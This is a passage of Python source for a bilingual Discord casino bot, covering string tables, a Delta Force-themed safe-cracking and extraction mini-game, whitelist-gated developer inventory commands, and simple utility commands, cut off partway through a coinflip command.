    "/crypto": "在動態虛擬市場中買賣加密貨幣。",
    "/work": "打工賺取穩定的金幣 (1小時冷卻)。",
    "/crime": "犯罪以獲取高風險高報酬 (2小時冷卻)。",
    "/upgrade": "升級你背包中的物品。",
    "/mine": "去挖礦！（需要在商店購買十字鎬）。",
    "/pet": "領養、餵食並與虛擬寵物玩耍。",
    "/marry <user>": "向其他用戶求婚。",
    "/fight <user>": "與其他玩家進行回合制 RPG 戰鬥。",
    "/wordchain <user>": "玩文字接龍遊戲。",
    "/mafia": "與 3 名以上的朋友玩一場快速的殺手/間諜遊戲。",
    "/keno <bet> <n1-n5>": "玩基諾彩。選擇 5 個數字 (1-80)。",
    "/scratch": "購買一張 200 🪙 的刮刮樂。",
    "/help": "用分類下拉選單查看所有指令。"
}

LANGUAGES = {
    "en": {
        "no_coins": "❌ Not enough coins! You have {coins} 🪙",
        "invalid_bet": "❌ Invalid bet amount! Use a number, 'all', or 'half'.",
        "game_active": "❌ You already have an active game running!",
        "win": "🎉 You won **{amt}** 🪙!",
        "lose": "💥 You lost **{amt}** 🪙.",
        "tie": "🤝 It's a tie! Your bet of **{amt}** 🪙 has been returned.",
        "lang_set": "✅ Language set to English.",
        "help_title": "🎰 Casino Bot Commands",
        "duel_challenge": "⚔️ {challenger} challenged {target} to a duel for {bet} 🪙! \n{target}, click Accept to fight!",
        "pay_invalid_target": "❌ Invalid target! You cannot pay yourself or a bot.",
        "pay_success": "✅ You successfully paid {target} **{amt}** 🪙!",
        "daily_success": "🎁 You claimed your daily reward of **{amt}** 🪙!",
        "daily_cooldown": "⏳ You need to wait **{hours}h {minutes}m** before claiming your next daily.",
        "stats_title": "📊 {name}'s Casino Stats",
        "stats_desc": "🪙 **Coins:** {coins}\n🎮 **Games Played:** {games}\n💸 **Total Wagered:** {wagered}\n🏆 **Total Won:** {won}",
        "ping_res": "🏓 Pong! Latency: **{ms}ms**",
        "roll_res": "🎲 You rolled a **{res}** (1-{sides})",
        "choose_res": "🤔 I choose: **{res}**",
        "aura_res": "✨ {user}'s Aura score is: **{score}**",
        "earn_prompt": "🧠 Solve this to earn coins (5s): **{math_eq} = ?**",
        "earn_success": "✅ Correct! You earned **{amt}** 🪙!",
        "earn_fail": "❌ Incorrect! The correct answer was **{ans}**.",
        "earn_cooldown": "⏳ You need to wait **{sec}s** before working again.",
        "timeout_penalty": "⏳ Time's up! You failed to answer in 5 seconds and lost **10 🪙**.",
        "help_cmds": HELP_EN
    },
    "zh": {
        "no_coins": "❌ 金幣不足！你只有 {coins} 🪙",
        "invalid_bet": "❌ 無效的下注金額！請使用數字、'all'(全部) 或 'half'(一半)。",
        "game_active": "❌ 你已經有一個正在進行的遊戲！",
        "win": "🎉 你贏得了 **{amt}** 🪙！",
        "lose": "💥 你輸了 **{amt}** 🪙。",
        "tie": "🤝 平局！已退還你的下注金額 **{amt}** 🪙。",
        "lang_set": "✅ 語言已設定為繁體中文。",
        "help_title": "🎰 賭場機器人指令列表",
        "duel_challenge": "⚔️ {challenger} 向 {target} 發起了 {bet} 🪙 的決鬥挑戰！\n{target}，點擊接受開始戰鬥！",
        "pay_invalid_target": "❌ 無效的目標！你不能付款給自己或機器人。",
        "pay_success": "✅ 你成功支付給 {target} **{amt}** 🪙！",
        "daily_success": "🎁 你領取了每日獎勵 **{amt}** 🪙！",
        "daily_cooldown": "⏳ 你還需要等待 **{hours}小時 {minutes}分鐘** 才能再次領取每日獎勵。",
        "stats_title": "📊 {name} 的賭場統計",
        "stats_desc": "🪙 **金幣:** {coins}\n🎮 **遊玩次數:** {games}\n💸 **總下注:** {wagered}\n🏆 **總贏取:** {won}",
        "ping_res": "🏓 Pong! 延遲：**{ms}ms**",
        "roll_res": "🎲 你擲出了 **{res}** (1-{sides})",
        "choose_res": "🤔 我選擇：**{res}**",
        "aura_res": "✨ {user} 的 Aura (光環) 分數是：**{score}**",
        "earn_prompt": "🧠 解答這道題目來賺取金幣 (5秒)：**{math_eq} = ?**",
        "earn_success": "✅ 答對了！你獲得了 **{amt}** 🪙！",
        "earn_fail": "❌ 答錯了！正確答案是 **{ans}**。",
        "earn_cooldown": "⏳ 你還需要等待 **{sec}秒** 才能再次打工。",
        "timeout_penalty": "⏳ 時間到！你沒有在 5 秒內回答，失去了 **10 🪙**。",
        "help_cmds": HELP_ZH
    }
}

def _t(user_id, key, **kwargs):
    uid = str(user_id)
    lang = user_data.get(uid, {}).get("lang", "en")
    if lang not in LANGUAGES: lang = "en"
    text = LANGUAGES[lang].get(key, LANGUAGES["en"].get(key, key))
    if isinstance(text, str):
        return text.format(**kwargs)
    return text

def get_help_dict(uid):
    lang = user_data.get(uid, {}).get("lang", "en")
    return LANGUAGES.get(lang, LANGUAGES["en"])["help_cmds"]

# ==========================================
# CORE BOT EVENTS
# ==========================================
@bot.event
async def on_ready():
    global backup_started

    load_data()
    print(f'{bot.user} is online! Data loaded.')

    if not backup_started:
        bot.loop.create_task(auto_backup_loop())
        backup_started = True
        print("☁️ Auto backup loop started")

    try:
        await tree.sync()
        print("Commands synced successfully!")
    except Exception as e:
        print(f"Sync failed: {e}")

# =========================
# DELTA FORCE TEST VERSION
# 無存檔測試版
# =========================

HACK_SYMBOLS = list(string.ascii_uppercase + string.digits)

ITEM_SIZE_WEIGHTS = [
    ((1, 1), 60),
    ((1, 2), 30),
    ((2, 2), 7),
    ((2, 3), 2.5),
    ((3, 3), 0.5),
]

ITEM_COUNT_WEIGHTS = [
    (1, 15),
    (2, 35),
    (3, 40),
    (4, 10),
]

SEARCH_TIMES = {
    "1x1": 1,
    "1x2": 1,
    "2x2": 1.5,
    "2x3": 2,
    "3x3": 3,
}


def weighted_choice(weighted):
    total = sum(w for _, w in weighted)
    r = random.uniform(0, total)
    upto = 0

    for item, weight in weighted:
        if upto + weight >= r:
            return item
        upto += weight

    return weighted[-1][0]


def generate_code():
    return [random.choice(HACK_SYMBOLS) for _ in range(5)]


def find_first_fit(grid, w, h):
    for y in range(4):
        for x in range(4):
            if x + w > 4 or y + h > 4:
                continue

            can_place = True

            for yy in range(y, y + h):
                for xx in range(x, x + w):
                    if grid[yy][xx] is not None:
                        can_place = False
                        break
                if not can_place:
                    break

            if can_place:
                return x, y

    return None


def generate_loot_grid():
    for _ in range(200):
        count = weighted_choice(ITEM_COUNT_WEIGHTS)
        sizes = [weighted_choice(ITEM_SIZE_WEIGHTS) for _ in range(count)]

        grid = [[None for _ in range(4)] for _ in range(4)]
        items = []
        success = True

        for idx, (w, h) in enumerate(sizes, start=1):
            pos = find_first_fit(grid, w, h)

            if pos is None:
                success = False
                break

            x, y = pos
            item_id = str(idx)

            for yy in range(y, y + h):
                for xx in range(x, x + w):
                    grid[yy][xx] = item_id

            items.append({
                "id": item_id,
                "size": f"{w}x{h}",
                "x": x,
                "y": y,
                "state": "hidden",
            })

        if success:
            return grid, items

    grid = [[None for _ in range(4)] for _ in range(4)]
    grid[0][0] = "1"

    return grid, [{
        "id": "1",
        "size": "1x1",
        "x": 0,
        "y": 0,
        "state": "hidden",
    }]


def render_loot_grid(grid, items):
    item_map = {item["id"]: item for item in items}

    lines = []

    for y in range(4):
        row = []

        for x in range(4):
            cell = grid[y][x]

            if cell is None:
                row.append("⬜️")
                continue

            item = item_map[cell]
            state = item.get("state", "hidden")

            if state == "hidden":
                row.append("⬛️")
            elif state == "searching":
                row.append("🔍")
            elif state == "done":
                row.append("💩")

        lines.append("".join(row))

    return "\n".join(lines)


class BigSafeHackTestView(discord.ui.View):
    def __init__(self, player):
        super().__init__(timeout=45)

        self.player = player
        self.code = generate_code()

        self.rows = [
            [random.choice(HACK_SYMBOLS) for _ in range(5)],
            [random.choice(HACK_SYMBOLS) for _ in range(5)],
            [random.choice(HACK_SYMBOLS) for _ in range(5)],
        ]

        self.current_index = 0
        self.locked = [False] * 5
        self.failed = False
        self.opened = False

        self.tick = 0
        self.message = None
        self.task = None

        self.loot_grid = None
        self.loot_items = None
        self.searching_loot = False

        self.edit_lock = asyncio.Lock()

    def render_slot(self):
        def fmt_row(row, middle=False):
            cells = []

            for i, ch in enumerate(row):
                if middle and i == self.current_index and not self.opened:
                    cells.append(f"[{ch}]")
                else:
                    cells.append(f" {ch} ")

            return " ".join(cells)

        top = fmt_row(self.rows[0])
        mid = fmt_row(self.rows[1], middle=True)
        bottom = fmt_row(self.rows[2])

        code_line = " ".join(
            f"✅{c}" if self.locked[i] else c
            for i, c in enumerate(self.code)
        )

        return (
            f"目標密碼：`{code_line}`\n"
            f"目前進度：**{self.current_index + 1}/5**\n\n"
            "```text\n"
            f"{top}\n"
            "-----------------------------\n"
            f"{mid}\n"
            "-----------------------------\n"
            f"{bottom}\n"
            "```\n"
            "按下「停止」讓框框停在當前密碼。"
        )

    def build_embed(self):
        if self.opened:
            return discord.Embed(
                title="大保險已開啟｜正在搜索",
                description=render_loot_grid(self.loot_grid, self.loot_items),
                color=0x00ff99
            )

        title = "破譯錯誤" if self.failed else "大保險破譯測試"

        return discord.Embed(
            title=title,
            description=self.render_slot(),
            color=0xff3333 if self.failed else 0xffcc00
        )

    async def safe_edit(self, *, embed=None, view=None):
        if not self.message:
            return

        async with self.edit_lock:
            try:
                await self.message.edit(embed=embed, view=view)
            except (discord.NotFound, discord.Forbidden):
                if self.task:
                    self.task.cancel()
            except discord.HTTPException:
                await asyncio.sleep(2)

    async def start_loop(self):
        try:
            while not self.opened:
                await asyncio.sleep(1.0)

                if self.failed or self.searching_loot:
                    continue

                self.tick += 1

                new_top = []

                for col in range(5):
                    if self.locked[col]:
                        new_top.append(self.code[col])
                    elif self.tick % 5 == 0:
                        new_top.append(self.code[col])
                    else:
                        new_top.append(random.choice(HACK_SYMBOLS))

                old_top = self.rows[0][:]
                old_mid = self.rows[1][:]

                for col in range(5):
                    if self.locked[col]:
                        self.rows[0][col] = self.code[col]
                        self.rows[1][col] = self.code[col]
                        self.rows[2][col] = self.code[col]
                    else:
                        self.rows[0][col] = new_top[col]
                        self.rows[1][col] = old_top[col]
                        self.rows[2][col] = old_mid[col]

                await self.safe_edit(embed=self.build_embed(), view=self)

        except asyncio.CancelledError:
            pass

    async def reveal_loot_loop(self):
        self.searching_loot = True
        self.loot_grid, self.loot_items = generate_loot_grid()

        await self.safe_edit(embed=self.build_embed(), view=None)

        for item in self.loot_items:
            item["state"] = "searching"
            await self.safe_edit(embed=self.build_embed(), view=None)

            await asyncio.sleep(SEARCH_TIMES[item["size"]])

            item["state"] = "done"
            await self.safe_edit(embed=self.build_embed(), view=None)

        self.searching_loot = False

    @discord.ui.button(label="停止", style=discord.ButtonStyle.danger)
    async def stop_button(
        self,
        interaction: discord.Interaction,
        button: discord.ui.Button
    ):
        if interaction.user.id != self.player.id:
            return await interaction.response.send_message(
                "這不是你的保險箱。",
                ephemeral=True
            )

        await interaction.response.defer()

        current = self.rows[1][self.current_index]
        target = self.code[self.current_index]

        if current == target:
            self.locked[self.current_index] = True
            self.rows[0][self.current_index] = target
            self.rows[1][self.current_index] = target
            self.rows[2][self.current_index] = target
            self.current_index += 1

            if self.current_index >= 5:
                self.opened = True
                self.clear_items()

                if self.task:
                    self.task.cancel()

                await self.safe_edit(
                    embed=discord.Embed(
                        title="大保險已開啟",
                        description="正在打開容器...",
                        color=0x00ff99
                    ),
                    view=None
                )

                return await self.reveal_loot_loop()

            return await self.safe_edit(
                embed=self.build_embed(),
                view=self
            )

        self.failed = True

        await self.safe_edit(
            embed=self.build_embed(),
            view=self
        )

        await asyncio.sleep(2)

        self.failed = False

        await self.safe_edit(
            embed=self.build_embed(),
            view=self
        )

    async def on_timeout(self):
        if self.task:
            self.task.cancel()

        self.clear_items()

        await self.safe_edit(view=None)


@tree.command(name="bigsafe_test", description="大保險破譯測試")
@app_commands.allowed_contexts(
    guilds=True,
    dms=True,
    private_channels=True
)
async def bigsafe_test(interaction: discord.Interaction):
    view = BigSafeHackTestView(interaction.user)

    await interaction.response.send_message(
        embed=view.build_embed(),
        view=view
    )

    msg = await interaction.original_response()
    view.message = msg
    view.task = asyncio.create_task(view.start_loop())

DELTA_LOCATIONS = {
    "遊客中心": ["阿薩拉營地", "行政樓"],
    "阿薩拉營地": ["變電站", "遊客中心"],
    "變電站": ["水泥廠", "阿薩拉營地", "行政樓"],
    "水泥廠": ["變電站", "軍營"],
    "軍營": ["水泥廠", "行政樓"],
    "壩體內部": ["行政樓"],
    "行政樓": ["壩體內部", "軍營", "變電站", "遊客中心"],
}

DELTA_SUB_AREAS = {
    "遊客中心": ["一樓", "二樓"],
    "水泥廠": ["外圍", "內部"],
    "變電站": ["小變電站", "大變電站"],
    "行政樓": ["東樓", "西樓"],
}

DELTA_COSTS = {
    ("遊客中心", "阿薩拉營地"): 1,
    ("阿薩拉營地", "變電站"): 1,
    ("變電站", "水泥廠"): 2,
    ("水泥廠", "軍營"): 2,
    ("軍營", "行政樓"): 1,
    ("遊客中心", "行政樓"): 4,
    ("變電站", "行政樓"): 4,
    ("行政樓", "壩體內部"): 2,
}

SPAWNS = [
    "軍營",
    "阿薩拉營地",
    "水泥廠",
    "行政樓",
    "變電站",
    "遊客中心",
    "壩體內部",
]

RISK = {
    "遊客中心": 2,
    "阿薩拉營地": 2,
    "變電站": 3,
    "水泥廠": 3,
    "軍營": 4,
    "行政樓": 5,
    "壩體內部": 4,
}

BIG_SAFE_POOL = [
    ("行政樓", "東樓"),
    ("行政樓", "西樓"),
    ("軍營", None),
    ("水泥廠", "內部"),
    ("變電站", "大變電站"),
    ("遊客中心", "二樓"),
]

SMALL_SAFE_POOL = [
    ("遊客中心", "一樓"),
    ("遊客中心", "二樓"),
    ("變電站", "小變電站"),
    ("變電站", "大變電站"),
    ("水泥廠", "外圍"),
    ("水泥廠", "內部"),
    ("軍營", None),
    ("行政樓", "東樓"),
    ("行政樓", "西樓"),
    ("壩體內部", None),
]

def travel_cost(a, b):
    return DELTA_COSTS.get((a, b)) or DELTA_COSTS.get((b, a)) or 1

def stars(n):
    n = max(1, min(5, int(n)))
    return "★" * n + "☆" * (5 - n)

def place_name(place):
    loc, sub = place
    return f"{loc}（{sub}）" if sub else loc

def distance_to_extract(start, extract):
    from collections import deque

    q = deque([(start, 0)])
    seen = {start}

    while q:
        loc, dist = q.popleft()

        if loc == extract:
            return dist

        for nxt in DELTA_LOCATIONS.get(loc, []):
            if nxt not in seen:
                seen.add(nxt)
                q.append((nxt, dist + travel_cost(loc, nxt)))

    return 999

def entry_sub_location(loc, prev=None):
    if loc == "遊客中心":
        return "一樓"

    if loc == "水泥廠":
        return "外圍"

    if loc == "變電站":
        return "小變電站" if prev == "阿薩拉營地" else "大變電站"

    if loc == "行政樓":
        if prev == "軍營":
            return "西樓"
        if prev == "遊客中心":
            return "東樓"
        return random.choice(["東樓", "西樓"])

    return None


class DeltaForceView(discord.ui.View):
    def __init__(self, player):
        super().__init__(timeout=180)

        self.player = player
        self.ap = 30
        self.location = random.choice(SPAWNS)
        self.prev_location = None
        self.sub_location = entry_sub_location(self.location)

        self.extract = self.choose_extract()
        self.loot = 0
        self.log = "似乎有什麼動靜..."
        self.started = False
        self.searched_places = set()
        self.danger = RISK.get(self.location, 2)

        self.big_safes = self.roll_big_safes()
        self.small_safes = self.roll_small_safes()

        self.breaker = random.random() < 0.5

    def choose_extract(self):
        d_to_tourist = distance_to_extract(self.location, "遊客中心")
        d_to_cement = distance_to_extract(self.location, "水泥廠")

        if d_to_tourist <= d_to_cement:
            return "水泥廠"

        return "遊客中心"

    def roll_big_safes(self):
        result = []

        # 行政樓必刷一個大保
        result.append(("行政樓", random.choice(["東樓", "西樓"])))

        pool = [x for x in BIG_SAFE_POOL if x[0] != "行政樓"]
        result.append(random.choice(pool))

        return result

    def roll_small_safes(self):
        count = random.randint(2, 4)
        result = []
        used_places = set(self.big_safes)

        # 行政樓必刷一個小保，但不能跟大保同位置
        admin_options = [
            ("行政樓", "東樓"),
            ("行政樓", "西樓"),
        ]
        admin_options = [x for x in admin_options if x not in used_places]

        if admin_options:
            pick = random.choice(admin_options)
            result.append(pick)
            used_places.add(pick)

        pool = [
            x for x in SMALL_SAFE_POOL
            if x[0] != "阿薩拉營地"
            and x not in used_places
        ]

        while len(result) < count and pool:
            pick = random.choice(pool)
            result.append(pick)
            used_places.add(pick)
            pool.remove(pick)

        return result

    def location_text(self):
        if self.sub_location:
            return f"{self.location}（{self.sub_location}）"
        return self.location

    def refresh_danger(self):
        base = RISK.get(self.location, 2)
        change = random.choice([-1, 0, 0, 1])
        self.danger = max(1, min(5, base + change))

    def refresh_view_items(self):
        self.clear_items()
        self.add_item(DeltaMoveSelect(self))
        self.add_item(DeltaSearchButton(self))
        self.add_item(DeltaCarefulButton(self))
        self.add_item(DeltaExtractButton(self))

    def build_embed(self):
        if not self.started:
            desc = (
                f"出生點：**{self.location_text()}**\n"
                f"模式：**普通**\n"
                f"戰備：**標準**\n"
                f"行動點：**{self.ap}**\n"
                f"撤離方向：**{self.extract}**\n\n"
                "［大保險］\n"
                + "\n".join(f"- {place_name(x)}" for x in self.big_safes) +
                "\n\n［小保險］\n"
                + "\n".join(f"- {place_name(x)}" for x in self.small_safes) +
                "\n\n特殊事件：\n"
                + ("破壁者行動已刷新。位置：阿薩拉營地" if self.breaker else "似乎有什麼動靜...")
            )

            return discord.Embed(
                title="三角洲行動模擬器｜零號大壩",
                description=desc,
                color=0x2b2d31
            )

        dist = distance_to_extract(self.location, self.extract)

        desc = (
            f"玩家：{self.player.mention}\n"
            f"當前行動點：**{self.ap}**\n"
            f"當前位置：**{self.location_text()}**\n"
            f"距離撤離點：**{dist}**\n"
            f"目前戰利品：**{self.loot}**\n\n"
            f"危險指數：{stars(self.danger)}\n"
            f"{self.log}\n\n"
            "請選擇行動。"
        )

        return discord.Embed(
            title="三角洲行動模擬器｜零號大壩",
            description=desc,
            color=0x5865F2
        )

    async def update(self, interaction):
        if self.ap <= 0:
            embed = discord.Embed(
                title="撤離失敗",
                description=f"行動點耗盡。\n本局戰利品遺失：{self.loot}",
                color=0xff0000
            )
            return await interaction.response.edit_message(embed=embed, view=None)

        await interaction.response.edit_message(
            embed=self.build_embed(),
            view=self
        )

    @discord.ui.button(label="開始行動", style=discord.ButtonStyle.success)
    async def start(self, interaction, button):
        if interaction.user.id != self.player.id:
            return await interaction.response.send_message("這不是你的行動。", ephemeral=True)

        self.started = True
        self.refresh_view_items()

        await interaction.response.edit_message(
            embed=self.build_embed(),
            view=self
        )


class DeltaMoveSelect(discord.ui.Select):
    def __init__(self, game):
        self.game = game
        options = []

        # 外部區域移動
        for loc in DELTA_LOCATIONS[game.location]:
            cost = travel_cost(game.location, loc)
            options.append(
                discord.SelectOption(
                    label=f"前往 {loc}",
                    description=f"區域移動｜消耗 {cost} 行動點",
                    value=f"move:{loc}"
                )
            )

        # 內部區域移動
        areas = DELTA_SUB_AREAS.get(game.location, [])
        for area in areas:
            if area != game.sub_location:
                options.append(
                    discord.SelectOption(
                        label=f"前往 {game.location}（{area}）",
                        description="區域內移動｜消耗 1 行動點",
                        value=f"sub:{area}"
                    )
                )

        super().__init__(
            placeholder="選擇移動位置",
            min_values=1,
            max_values=1,
            options=options
        )

    async def callback(self, interaction):
        game = self.game

        if interaction.user.id != game.player.id:
            return await interaction.response.send_message("這不是你的行動。", ephemeral=True)

        value = self.values[0]

        if value.startswith("move:"):
            target = value.replace("move:", "")
            cost = travel_cost(game.location, target)

            if game.ap < cost:
                game.log = "行動點不足，無法移動。"
                return await game.update(interaction)

            game.ap -= cost
            game.prev_location = game.location
            game.location = target
            game.sub_location = entry_sub_location(target, game.prev_location)
            game.log = f"你移動到了 {game.location_text()}。"

        elif value.startswith("sub:"):
            target_sub = value.replace("sub:", "")
            cost = 1

            if game.ap < cost:
                game.log = "行動點不足，無法移動。"
                return await game.update(interaction)

            game.ap -= cost
            game.sub_location = target_sub
            game.log = f"你移動到了 {game.location_text()}。"

        game.refresh_danger()
        game.refresh_view_items()

        await game.update(interaction)


class DeltaSearchButton(discord.ui.Button):
    def __init__(self, game):
        super().__init__(label="原地搜索", style=discord.ButtonStyle.primary)
        self.game = game

    async def callback(self, interaction):
        game = self.game

        if interaction.user.id != game.player.id:
            return await interaction.response.send_message("這不是你的行動。", ephemeral=True)

        place_key = f"{game.location}:{game.sub_location or 'main'}"

        if place_key in game.searched_places:
            game.log = "這個位置已經被搜索過了。"
            return await game.update(interaction)

        if game.ap < 0.5:
            game.log = "行動點不足，無法搜索。"
            return await game.update(interaction)

        game.searched_places.add(place_key)

        gain = random.randint(1000, 5000) * RISK.get(game.location, 2)
        game.loot += gain
        game.ap -= 0.5
        game.log = f"你搜索了一圈，找到價值 {gain} 的物資。"

        game.refresh_danger()

        await game.update(interaction)


class DeltaCarefulButton(discord.ui.Button):
    def __init__(self, game):
        super().__init__(label="謹慎排點", style=discord.ButtonStyle.secondary)
        self.game = game

    async def callback(self, interaction):
        game = self.game

        if interaction.user.id != game.player.id:
            return await interaction.response.send_message("這不是你的行動。", ephemeral=True)

        if game.ap < 0.5:
            game.log = "行動點不足，無法排點。"
            return await game.update(interaction)

        game.ap -= 0.5
        game.danger = max(1, game.danger - random.choice([0, 1]))
        game.log = "你放慢腳步檢查周圍，心理上安全了一點。"

        await game.update(interaction)


class DeltaExtractButton(discord.ui.Button):
    def __init__(self, game):
        super().__init__(label="嘗試撤離", style=discord.ButtonStyle.danger)
        self.game = game

    async def callback(self, interaction):
        game = self.game

        if interaction.user.id != game.player.id:
            return await interaction.response.send_message("這不是你的行動。", ephemeral=True)

        if game.location != game.extract:
            dist = distance_to_extract(game.location, game.extract)
            game.log = f"你距離撤離點還有 {dist}，現在不能撤離。"
            return await game.update(interaction)

        if game.ap < 1:
            game.log = "行動點不足，無法完成撤離。"
            return await game.update(interaction)

        game.ap -= 1

        embed = discord.Embed(
            title="成功撤離",
            description=(
                f"玩家：{game.player.mention}\n"
                f"剩餘行動點：**{game.ap}**\n"
                f"帶出戰利品價值：**{game.loot}**\n"
                "測試版不寫入存檔。"
            ),
            color=0x00ff99
        )

        await interaction.response.edit_message(embed=embed, view=None)


@tree.command(name="deltaforce", description="Delta Force simulator test")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def deltaforce(interaction: discord.Interaction):
    view = DeltaForceView(interaction.user)

    await interaction.response.send_message(
        embed=view.build_embed(),
        view=view
    )

# ==========================================
# HELP & SETTINGS COMMANDS
# ==========================================
@tree.command(name="language", description="Change your language / 更改你的語言")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.choices(lang=[
    app_commands.Choice(name="English", value="en"),
    app_commands.Choice(name="繁體中文 (Chinese)", value="zh")
])
async def language(interaction: discord.Interaction, lang: app_commands.Choice[str]):
    uid = str(interaction.user.id)
    init_user(uid)
    user_data[uid]["lang"] = lang.value
    save_data()
    await interaction.response.send_message(_t(uid, "lang_set"), ephemeral=True)

class HelpPaginationView(discord.ui.View):
    def __init__(self, uid, embeds):
        super().__init__(timeout=180)
        self.uid = uid
        self.embeds = embeds
        self.current_page = 0
        self.update_buttons()

    def update_buttons(self):
        self.prev_button.disabled = self.current_page == 0
        self.next_button.disabled = self.current_page == len(self.embeds) - 1

    @discord.ui.button(label="Previous", style=discord.ButtonStyle.primary, emoji="◀️")
    async def prev_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid:
            return await interaction.response.send_message("❌ This menu is not for you!", ephemeral=True)
        self.current_page -= 1
        self.update_buttons()
        await interaction.response.edit_message(embed=self.embeds[self.current_page], view=self)

    @discord.ui.button(label="Next", style=discord.ButtonStyle.primary, emoji="▶️")
    async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid:
            return await interaction.response.send_message("❌ This menu is not for you!", ephemeral=True)
        self.current_page += 1
        self.update_buttons()
        await interaction.response.edit_message(embed=self.embeds[self.current_page], view=self)

from discord import app_commands

# ==========================================
# ⚙️ Configuration
# ==========================================

# 開發者白名單 (Authorized Developer IDs)
WHITELIST_IDS = [1324386209539166268, 1130015134887198790, 973928719318142977]

# 全局物品清單 (Global Item List for Autocomplete)
ALL_ITEMS_LIST = [
    # --- Fishing Rods ---
    "Fishing Rod", 
    "Fishing Rod Lvl 2", 
    "Fishing Rod Lvl 3", 
    "Fishing Rod Lvl 4", 
    "Fishing Rod Lvl 5",
    
    # --- Pickaxes ---
    "Pickaxe", 
    "Pickaxe Lvl 2", 
    "Pickaxe Lvl 3", 
    "Pickaxe Lvl 4", 
    "Pickaxe Lvl 5",
    
    # --- Special Fish (Materials) ---
    "🌌 Void whale (CELESTIAL!!!)", 
    "⚡ Storm eel (CELESTIAL!!!)", 
    "🧿 Deep abyss eye (CELESTIAL!!!)", 
    "⛩️ Coral titan (CELESTIAL!!!)", 
    "🏺 Ancient relic catch (SPECIAL!!!)"
]

@tree.command(name="invmanager", description="[Developer Only] Manage user inventory")
# 允許在伺服器、私訊、以及私人頻道使用
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(action="Action to perform", item="Select an item (optional)")
@app_commands.choices(action=[
    app_commands.Choice(name="Get Item", value="get"),
    app_commands.Choice(name="Remove Item", value="remove"),
    app_commands.Choice(name="Clear All", value="clear")
])
async def invmanager(interaction: discord.Interaction, action: str, item: str = None):
    # 1. 權限檢查 (Permission Check)
    if interaction.user.id not in WHITELIST_IDS:
        return await interaction.response.send_message("❌ Access Denied: Authorized Developers Only.", ephemeral=True)

    uid = str(interaction.user.id)
    
    # 2. 存取鎖定與資料處理 (Concurrency Lock & Data Handling)
    async with get_user_lock(uid):
        user = init_user(uid)
        
        # --- 清空背包 (Clear Action) ---
        if action == "clear":
            user["inventory"] = []
            msg = "🧹 **[DEV]** Inventory has been cleared successfully!"
        
        # --- 獲取物品 (Get Action) ---
        elif action == "get":
            if not item: 
                return await interaction.response.send_message("❌ Error: You must select an item to get.", ephemeral=True)
            user["inventory"].append(item)
            msg = f"✅ **[DEV]** Item added to inventory: **{item}**"
            
        # --- 移除物品 (Remove Action) ---
        elif action == "remove":
            if not item: 
                return await interaction.response.send_message("❌ Error: You must select an item to remove.", ephemeral=True)
            
            if "inventory" in user and item in user["inventory"]:
                user["inventory"].remove(item)
                msg = f"🔥 **[DEV]** Item removed from inventory: **{item}**"
            else:
                msg = f"❌ **[DEV]** Item not found in your inventory: **{item}**"

        # 3. 儲存變更 (Save Data)
        save_data()
    
    await interaction.response.send_message(msg, ephemeral=True)

# ==========================================
# 🔄 自動補全邏輯 (Autocomplete Logic)
# ==========================================

@invmanager.autocomplete('item')
async def inv_item_autocomplete(interaction: discord.Interaction, current: str):
    action = interaction.namespace.action
    uid = str(interaction.user.id)
    user = init_user(uid)
    
    choices = []
    
    # 如果是獲取物品，顯示全局清單
    if action == "get":
        choices = [
            app_commands.Choice(name=name, value=name)
            for name in ALL_ITEMS_LIST if current.lower() in name.lower()
        ]
        
    # 如果是移除物品，僅顯示該玩家背包現有的東西 (去重處理)
    elif action == "remove":
        my_inv = list(set(user.get("inventory", [])))
        choices = [
            app_commands.Choice(name=name, value=name)
            for name in my_inv if current.lower() in name.lower()
        ]
    
    # Discord 限制最多顯示 25 個選項
    return choices[:25]

@tree.command(name="reset_world", description="[DEVELOPER ONLY]Reset your mining world.")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def reset_world(interaction):
    global world

    # ❗ 白名單檢查
    if interaction.user.id not in WHITELIST_IDS:
        return await interaction.response.send_message("❌ No permissions.", ephemeral=True)

    # 🔥 重製 world
    world.clear()

    # 🔧 重製玩家 mining 狀態
    for uid in user_data:
        user_data[uid]["mine_px"] = 0
        user_data[uid]["mine_depth"] = 0
        user_data[uid]["max_depth"] = 0

    save_data()

    await interaction.response.send_message("🌍 World fully reset!", ephemeral=True)

@tree.command(name="echo", description="Echo a message")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def echo(interaction: discord.Interaction, message: str): 
    await interaction.response.send_message(message)

@tree.command(name="ping", description="Check bot latency")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def ping(interaction: discord.Interaction): 
    await interaction.response.send_message(f"🏓 Pong! Latency: {round(bot.latency * 1000)}ms")

@tree.command(name="roll", description="Roll a dice")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def roll(interaction: discord.Interaction, sides: int = 6): 
    await interaction.response.send_message(f"🎲 You rolled a **{random.randint(1, max(2, sides))}** (1-{max(2, sides)})")

@tree.command(name="choose", description="Choose between two options")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def choose(interaction: discord.Interaction, option1: str, option2: str):

    chosen = random.choice([option1, option2])

    await interaction.response.send_message(
        f"🤔 Options:\n"
        f"1️⃣ {option1}\n"
        f"2️⃣ {option2}\n\n"
        f"🎉 I choose: **{chosen}**"
    )

@tree.command(name="avatar", description="Get a user's avatar")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def avatar(interaction: discord.Interaction, target: discord.User = None):
    user = target or interaction.user
    embed = discord.Embed(title=f"{user.display_name}'s Avatar", color=discord.Color.blue())
    embed.set_image(url=user.display_avatar.url)
    await interaction.response.send_message(embed=embed)
@tree.command(name="coinflip", description="Flip a coin and bet on Heads or Tails")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.choices(choice=[app_commands.Choice(name="Heads", value="heads"), app_commands.Choice(name="Tails", value="tails")])
async def coinflip(interaction: discord.Interaction, bet: str, choice: app_commands.Choice[str]):
    amt = await validate_bet(interaction, bet)
    if not amt: return
    uid = str(interaction.user.id)
    result = random.choice(["heads", "tails"])
    msg = f"🪙 The coin lands on **{result.capitalize()}**!\n\n"
    if choice.value == result:
